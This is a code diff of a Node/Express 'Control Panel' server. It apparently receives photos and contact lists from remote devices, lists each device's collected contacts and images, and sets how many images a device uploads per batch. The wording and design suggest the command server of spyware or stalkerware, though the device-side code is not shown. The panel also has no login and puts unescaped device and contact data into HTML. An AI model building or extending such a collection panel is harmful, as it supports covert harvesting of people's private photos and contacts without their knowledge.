@@ -54,7 +54,6 @@ const sharedStyles = `
       color: #e2e8f0;
       font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
       min-height: 100vh;
-      padding: 0;
     }
     .topbar {
       background: #0d1526;
@@ -72,6 +71,7 @@ const sharedStyles = `
       font-weight: 700;
       color: #22c55e;
       letter-spacing: -0.5px;
+      text-decoration: none;
     }
     .topbar nav { margin-left: auto; display: flex; gap: 8px; }
     .topbar nav a {
@@ -84,48 +84,8 @@ const sharedStyles = `
     }
     .topbar nav a:hover { background: #1e2d4a; color: #e2e8f0; }
     .page { padding: 36px 32px; max-width: 1100px; margin: 0 auto; }
-    .page-title {
-      font-size: 26px;
-      font-weight: 700;
-      color: #f1f5f9;
-      margin-bottom: 6px;
-    }
-    .page-subtitle {
-      font-size: 14px;
-      color: #64748b;
-      margin-bottom: 32px;
-    }
-    .stats-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-      gap: 16px;
-      margin-bottom: 32px;
-    }
-    .stat-card {
-      background: #0d1526;
-      border: 1px solid #1e2d4a;
-      border-radius: 14px;
-      padding: 22px 24px;
-    }
-    .stat-card .stat-icon {
-      width: 40px; height: 40px;
-      border-radius: 10px;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 18px;
-      margin-bottom: 14px;
-    }
-    .stat-card .stat-label {
-      font-size: 12px;
-      color: #64748b;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      margin-bottom: 6px;
-    }
-    .stat-card .stat-value {
-      font-size: 32px;
-      font-weight: 700;
-      color: #f1f5f9;
-    }
+    .page-title { font-size: 26px; font-weight: 700; color: #f1f5f9; margin-bottom: 6px; }
+    .page-subtitle { font-size: 14px; color: #64748b; margin-bottom: 32px; }
     .card {
       background: #0d1526;
       border: 1px solid #1e2d4a;
@@ -140,7 +100,30 @@ const sharedStyles = `
       margin-bottom: 18px;
       padding-bottom: 14px;
       border-bottom: 1px solid #1e2d4a;
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
+    .stat-card {
+      background: #0d1526;
+      border: 1px solid #1e2d4a;
+      border-radius: 14px;
+      padding: 28px 32px;
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      gap: 24px;
+    }
+    .stat-icon-wrap {
+      width: 56px; height: 56px;
+      border-radius: 14px;
+      background: #0d2d1a;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 24px;
+      flex-shrink: 0;
+    }
+    .stat-label { font-size: 13px; color: #64748b; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 4px; }
+    .stat-value { font-size: 42px; font-weight: 700; color: #f1f5f9; line-height: 1; }
     .form-row { display: flex; gap: 12px; align-items: flex-end; flex-wrap: wrap; }
     .form-group { display: flex; flex-direction: column; gap: 6px; }
     .form-group label { font-size: 12px; color: #64748b; text-transform: uppercase; letter-spacing: 0.6px; }
@@ -171,87 +154,46 @@ const sharedStyles = `
     }
     .btn-primary { background: #22c55e; color: #052e16; }
     .btn-primary:hover { background: #16a34a; }
-    .btn-secondary {
-      background: transparent;
-      border: 1px solid #1e2d4a;
-      color: #94a3b8;
-    }
+    .btn-secondary { background: transparent; border: 1px solid #1e2d4a; color: #94a3b8; }
     .btn-secondary:hover { background: #1e2d4a; color: #e2e8f0; }
-    .links-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 12px;
-    }
-    .link-card {
-      background: #131f38;
+    .btn-blue { background: #1d4ed8; color: #fff; }
+    .btn-blue:hover { background: #1e40af; }
+    .btn-green { background: #15803d; color: #f0fdf4; }
+    .btn-green:hover { background: #166534; }
+
+    /* Users list */
+    .user-list { display: flex; flex-direction: column; gap: 12px; }
+    .user-row {
+      background: #0d1526;
       border: 1px solid #1e2d4a;
       border-radius: 12px;
-      padding: 18px 20px;
-      text-decoration: none;
-      color: #e2e8f0;
+      padding: 16px 20px;
       display: flex;
       align-items: center;
-      gap: 12px;
-      transition: all 0.2s;
-      font-size: 14px;
-      font-weight: 500;
+      gap: 16px;
     }
-    .link-card:hover { border-color: #22c55e; background: #0d1f10; color: #22c55e; }
-    .link-icon {
-      width: 36px; height: 36px;
-      border-radius: 8px;
-      background: #1e2d4a;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 16px;
-      flex-shrink: 0;
-    }
-
-    /* Users page */
-    .user-list { display: flex; flex-direction: column; gap: 10px; }
-    .user-row {
-      background: #131f38;
-      border: 1px solid #1e2d4a;
-      border-radius: 10px;
-      padding: 14px 18px;
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      text-decoration: none;
-      color: #e2e8f0;
-      transition: all 0.2s;
-    }
-    .user-row:hover { border-color: #22c55e; }
     .user-avatar {
-      width: 38px; height: 38px;
+      width: 42px; height: 42px;
       border-radius: 50%;
-      background: linear-gradient(135deg, #22c55e22, #1e4d2b);
+      background: #0d2d1a;
       border: 1px solid #22c55e44;
       display: flex; align-items: center; justify-content: center;
-      font-size: 13px;
-      font-weight: 600;
+      font-size: 14px;
+      font-weight: 700;
       color: #22c55e;
       flex-shrink: 0;
     }
-    .user-id { font-size: 14px; font-weight: 500; color: #cbd5e1; }
-    .badge {
-      margin-left: auto;
-      padding: 4px 10px;
-      border-radius: 20px;
-      font-size: 12px;
-      background: #22c55e18;
-      color: #22c55e;
-      border: 1px solid #22c55e33;
-    }
+    .user-id { font-size: 14px; font-weight: 500; color: #cbd5e1; flex: 1; word-break: break-all; }
+    .user-actions { display: flex; gap: 10px; flex-shrink: 0; }
 
-    /* User detail */
+    /* Images grid */
     .images-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
-      gap: 12px;
-      margin-bottom: 8px;
+      grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+      gap: 14px;
     }
     .img-wrapper {
-      border-radius: 10px;
+      border-radius: 12px;
       overflow: hidden;
       border: 1px solid #1e2d4a;
       aspect-ratio: 1;
@@ -263,15 +205,10 @@ const sharedStyles = `
       display: block;
       transition: transform 0.3s;
     }
-    .img-wrapper:hover img { transform: scale(1.05); }
-    .empty-state {
-      padding: 24px;
-      text-align: center;
-      color: #334155;
-      font-size: 14px;
-    }
+    .img-wrapper:hover img { transform: scale(1.06); }
+    .empty-state { padding: 28px; text-align: center; color: #334155; font-size: 14px; }
 
-    /* Contacts page */
+    /* Contacts table */
     .contacts-table { width: 100%; border-collapse: collapse; }
     .contacts-table th {
       text-align: left;
@@ -288,28 +225,37 @@ const sharedStyles = `
       border-top: 1px solid #1e2d4a;
     }
     .contacts-table tr:hover td { background: #131f38; }
-    .device-badge {
-      display: inline-block;
+    .contact-name { display: flex; align-items: center; gap: 10px; }
+    .contact-dot { width: 7px; height: 7px; border-radius: 50%; background: #22c55e; flex-shrink: 0; }
+    .count-badge {
+      display: inline-flex;
+      align-items: center;
       padding: 3px 10px;
-      border-radius: 6px;
+      border-radius: 20px;
       font-size: 12px;
-      background: #1e2d4a;
-      color: #94a3b8;
-      font-family: monospace;
-    }
-    .contact-name {
-      display: flex; align-items: center; gap: 8px;
-    }
-    .contact-dot {
-      width: 7px; height: 7px;
-      border-radius: 50%;
-      background: #22c55e;
-      flex-shrink: 0;
+      font-weight: 600;
+      background: #22c55e18;
+      color: #22c55e;
+      border: 1px solid #22c55e33;
+      margin-left: 6px;
     }
   </style>
 `;
 
-// ================= CONTROL =================
+// ================= TOPBAR HELPER =================
+function topbar() {
+  return `
+    <div class="topbar">
+      <a href="/" class="logo">&#9670; Control Panel</a>
+      <nav>
+        <a href="/">Dashboard</a>
+        <a href="/users">Users</a>
+      </nav>
+    </div>
+  `;
+}
+
+// ================= CONTROL CONFIG =================
 let config = { limit: 5, offset: 0 };
 
 app.get("/config/:device_id", (req, res) => {
@@ -319,78 +265,32 @@ app.get("/config/:device_id", (req, res) => {
 app.post("/set-config", (req, res) => {
   config.limit = parseInt(req.body.limit);
   config.offset = parseInt(req.body.offset);
-  res.redirect("/control");
+  res.redirect("/user/" + req.body.device_id + "/images");
 });
 
 // ================= DASHBOARD =================
 app.get("/", async (req, res) => {
   const users = await pool.query("SELECT COUNT(*) FROM users");
-  const images = await pool.query("SELECT COUNT(*) FROM images");
-  const contacts = await pool.query("SELECT COUNT(*) FROM contacts");
 
   res.send(`
   <html><head><title>Dashboard</title>${sharedStyles}</head>
   <body>
-    <div class="topbar">
-      <span class="logo">&#9670; Control Panel</span>
-      <nav>
-        <a href="/">Dashboard</a>
-        <a href="/users">Users</a>
-        <a href="/contacts">Contacts</a>
-      </nav>
-    </div>
+    ${topbar()}
     <div class="page">
       <div class="page-title">Dashboard</div>
-      <div class="page-subtitle">Overview of all collected data</div>
+      <div class="page-subtitle">Control panel overview</div>
 
-      <div class="stats-grid">
-        <div class="stat-card">
-          <div class="stat-icon" style="background:#0d2d1a;">&#128100;</div>
+      <div class="stat-card">
+        <div class="stat-icon-wrap">&#128100;</div>
+        <div>
           <div class="stat-label">Total Users</div>
           <div class="stat-value">${users.rows[0].count}</div>
         </div>
-        <div class="stat-card">
-          <div class="stat-icon" style="background:#0d1f38;">&#128247;</div>
-          <div class="stat-label">Images</div>
-          <div class="stat-value">${images.rows[0].count}</div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-icon" style="background:#2d1a00;">&#128222;</div>
-          <div class="stat-label">Contacts</div>
-          <div class="stat-value">${contacts.rows[0].count}</div>
-        </div>
       </div>
 
-      <div class="card">
-        <h3>&#9881; Upload Configuration</h3>
-        <form method="POST" action="/set-config">
-          <div class="form-row">
-            <div class="form-group">
-              <label>Limit</label>
-              <input type="number" name="limit" value="${config.limit}"/>
-            </div>
-            <div class="form-group">
-              <label>Offset</label>
-              <input type="number" name="offset" value="${config.offset}"/>
-            </div>
-            <button type="submit" class="btn btn-primary">&#10003; Update Config</button>
-          </div>
-        </form>
-      </div>
-
-      <div class="card">
-        <h3>&#128279; Quick Navigation</h3>
-        <div class="links-grid">
-          <a href="/users" class="link-card">
-            <div class="link-icon">&#128101;</div>
-            View All Users
-          </a>
-          <a href="/contacts" class="link-card">
-            <div class="link-icon">&#128222;</div>
-            View All Contacts
-          </a>
-        </div>
-      </div>
+      <a href="/users" class="btn btn-primary" style="font-size:16px; padding:14px 32px;">
+        &#128101;&nbsp; View Users
+      </a>
     </div>
   </body></html>
   `);
@@ -438,35 +338,42 @@ app.post("/upload-image", upload.single("image"), async (req, res) => {
   }
 });
 
-// ================= USERS =================
+// ================= USERS LIST =================
 app.get("/users", async (req, res) => {
   const users = await pool.query("SELECT * FROM users");
 
   let rows = "";
-  users.rows.forEach((u, i) => {
+  for (const u of users.rows) {
     const initials = u.device_id.substring(0, 2).toUpperCase();
+    const imgCount = await pool.query(
+      "SELECT COUNT(*) FROM images WHERE device_id=$1", [u.device_id]
+    );
+    const conCount = await pool.query(
+      "SELECT COUNT(DISTINCT contact) FROM contacts WHERE device_id=$1", [u.device_id]
+    );
     rows += `
-      <a href="/user/${u.device_id}" class="user-row">
+      <div class="user-row">
         <div class="user-avatar">${initials}</div>
         <div class="user-id">${u.device_id}</div>
-        <span class="badge">View &rarr;</span>
-      </a>
+        <div class="user-actions">
+          <a href="/user/${u.device_id}/contacts" class="btn btn-green">
+            &#128222; Contacts <span class="count-badge">${conCount.rows[0].count}</span>
+          </a>
+          <a href="/user/${u.device_id}/images" class="btn btn-blue">
+            &#128247; Images <span class="count-badge">${imgCount.rows[0].count}</span>
+          </a>
+        </div>
+      </div>
     `;
-  });
+  }
 
   res.send(`
   <html><head><title>Users</title>${sharedStyles}</head>
   <body>
-    <div class="topbar">
-      <span class="logo">&#9670; Control Panel</span>
-      <nav>
-        <a href="/">Dashboard</a>
-        <a href="/users">Users</a>
-        <a href="/contacts">Contacts</a>
-      </nav>
-    </div>
+    ${topbar()}
     <div class="page">
-      <div class="page-title">All Users</div>
+      <a href="/" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back</a>
+      <div class="page-title" style="margin-top:16px;">All Users</div>
       <div class="page-subtitle">${users.rows.length} registered device(s)</div>
       <div class="user-list">
         ${rows || '<div class="empty-state">No users found.</div>'}
@@ -476,16 +383,63 @@ app.get("/users", async (req, res) => {
   `);
 });
 
-// ================= USER DATA =================
-app.get("/user/:device_id", async (req, res) => {
+// ================= USER CONTACTS (DEDUPLICATED) =================
+app.get("/user/:device_id/contacts", async (req, res) => {
+  const device = req.params.device_id;
+
+  const contacts = await pool.query(
+    "SELECT DISTINCT contact FROM contacts WHERE device_id=$1 ORDER BY contact",
+    [device]
+  );
+
+  let contactRows = "";
+  contacts.rows.forEach((c, i) => {
+    contactRows += `
+      <tr>
+        <td style="color:#475569; font-size:13px; width:50px;">${i + 1}</td>
+        <td><div class="contact-name"><div class="contact-dot"></div>${c.contact}</div></td>
+      </tr>
+    `;
+  });
+
+  res.send(`
+  <html><head><title>Contacts - ${device}</title>${sharedStyles}</head>
+  <body>
+    ${topbar()}
+    <div class="page">
+      <a href="/users" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back to Users</a>
+      <div class="page-title" style="margin-top:16px;">Contacts</div>
+      <div class="page-subtitle" style="font-family:monospace;">${device}</div>
+
+      <div class="card" style="padding:0; overflow:hidden;">
+        <div style="padding:20px 24px 16px; border-bottom:1px solid #1e2d4a; display:flex; align-items:center; gap:8px;">
+          <span style="font-size:15px; font-weight:600; color:#cbd5e1;">&#128222; Contact List</span>
+          <span class="count-badge">${contacts.rows.length} unique</span>
+        </div>
+        ${contactRows
+          ? `<table class="contacts-table">
+              <thead>
+                <tr>
+                  <th style="padding:14px 16px 10px;">#</th>
+                  <th style="padding:14px 16px 10px;">Contact</th>
+                </tr>
+              </thead>
+              <tbody>${contactRows}</tbody>
+             </table>`
+          : '<div class="empty-state">No contacts found.</div>'
+        }
+      </div>
+    </div>
+  </body></html>
+  `);
+});
+
+// ================= USER IMAGES =================
+app.get("/user/:device_id/images", async (req, res) => {
   const device = req.params.device_id;
 
   const images = await pool.query(
     "SELECT * FROM images WHERE device_id=$1",
-    [device]
-  );
-  const contacts = await pool.query(
-    "SELECT * FROM contacts WHERE device_id=$1",
     [device]
   );
 
@@ -498,94 +452,41 @@ app.get("/user/:device_id", async (req, res) => {
     `;
   });
 
-  let contactRows = "";
-  contacts.rows.forEach(c => {
-    contactRows += `
-      <tr>
-        <td><div class="contact-name"><div class="contact-dot"></div>${c.contact}</div></td>
-      </tr>
-    `;
-  });
-
   res.send(`
-  <html><head><title>Device: ${device}</title>${sharedStyles}</head>
+  <html><head><title>Images - ${device}</title>${sharedStyles}</head>
   <body>
-    <div class="topbar">
-      <span class="logo">&#9670; Control Panel</span>
-      <nav>
-        <a href="/">Dashboard</a>
-        <a href="/users">Users</a>
-        <a href="/contacts">Contacts</a>
-      </nav>
-    </div>
+    ${topbar()}
     <div class="page">
-      <a href="/users" class="btn btn-secondary" style="margin-bottom:20px;">&larr; Back to Users</a>
-      <div class="page-title" style="margin-top:16px;">Device Details</div>
+      <a href="/users" class="btn btn-secondary" style="margin-bottom:24px;">&larr; Back to Users</a>
+      <div class="page-title" style="margin-top:16px;">Images</div>
       <div class="page-subtitle" style="font-family:monospace;">${device}</div>
 
       <div class="card">
-        <h3>&#128247; Images (${images.rows.length})</h3>
-        ${imgGrid
-          ? `<div class="images-grid">${imgGrid}</div>`
-          : '<div class="empty-state">No images uploaded.</div>'
-        }
+        <h3>&#9881; Upload Configuration</h3>
+        <form method="POST" action="/set-config">
+          <input type="hidden" name="device_id" value="${device}"/>
+          <div class="form-row">
+            <div class="form-group">
+              <label>Limit</label>
+              <input type="number" name="limit" value="${config.limit}"/>
+            </div>
+            <div class="form-group">
+              <label>Offset</label>
+              <input type="number" name="offset" value="${config.offset}"/>
+            </div>
+            <button type="submit" class="btn btn-primary">&#10003; Update Config</button>
+          </div>
+        </form>
       </div>
 
       <div class="card">
-        <h3>&#128222; Contacts (${contacts.rows.length})</h3>
-        ${contactRows
-          ? `<table class="contacts-table">
-              <thead><tr><th>Contact</th></tr></thead>
-              <tbody>${contactRows}</tbody>
-             </table>`
-          : '<div class="empty-state">No contacts found.</div>'
-        }
-      </div>
-    </div>
-  </body></html>
-  `);
-});
-
-// ================= CONTACTS PAGE =================
-app.get("/contacts", async (req, res) => {
-  const contacts = await pool.query("SELECT * FROM contacts ORDER BY device_id");
-
-  let rows = "";
-  contacts.rows.forEach(c => {
-    rows += `
-      <tr>
-        <td><span class="device-badge">${c.device_id}</span></td>
-        <td><div class="contact-name"><div class="contact-dot"></div>${c.contact}</div></td>
-      </tr>
-    `;
-  });
-
-  res.send(`
-  <html><head><title>Contacts</title>${sharedStyles}</head>
-  <body>
-    <div class="topbar">
-      <span class="logo">&#9670; Control Panel</span>
-      <nav>
-        <a href="/">Dashboard</a>
-        <a href="/users">Users</a>
-        <a href="/contacts">Contacts</a>
-      </nav>
-    </div>
-    <div class="page">
-      <div class="page-title">All Contacts</div>
-      <div class="page-subtitle">${contacts.rows.length} contact(s) collected</div>
-      <div class="card" style="padding:0; overflow:hidden;">
-        ${rows
-          ? `<table class="contacts-table">
-              <thead style="padding:16px;">
-                <tr>
-                  <th style="padding:16px 16px 12px;">Device ID</th>
-                  <th style="padding:16px 16px 12px;">Contact</th>
-                </tr>
-              </thead>
-              <tbody>${rows}</tbody>
-             </table>`
-          : '<div class="empty-state" style="padding:32px;">No contacts found.</div>'
+        <h3>
+          &#128247; Received Images
+          <span class="count-badge">${images.rows.length}</span>
+        </h3>
+        ${imgGrid
+          ? `<div class="images-grid">${imgGrid}</div>`
+          : '<div class="empty-state">No images uploaded yet.</div>'
         }
       </div>
     </div>
